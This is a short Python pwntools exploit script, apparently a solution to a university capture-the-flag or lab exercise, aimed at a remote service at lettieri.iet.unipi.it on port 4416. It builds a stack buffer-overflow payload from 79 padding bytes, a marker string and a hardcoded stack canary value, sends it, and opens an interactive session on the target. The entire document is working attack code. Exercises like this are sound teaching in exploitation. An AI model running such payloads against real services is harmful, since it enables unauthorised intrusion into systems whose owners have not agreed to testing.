from pwn import *


HOST = "lettieri.iet.unipi.it" 
PORT = 4416 

canary = 0x3b9717ae79ef55a0

p1 = b"le\n"
p1 += b"A" * 79

p2 = b"GSNH\x00abc"
p2 += p64(canary)
p2 += b"G\n"

payload = p1 + p2

# connect to the target
conn = remote(HOST, PORT)
conn.send(payload)
conn.interactive()
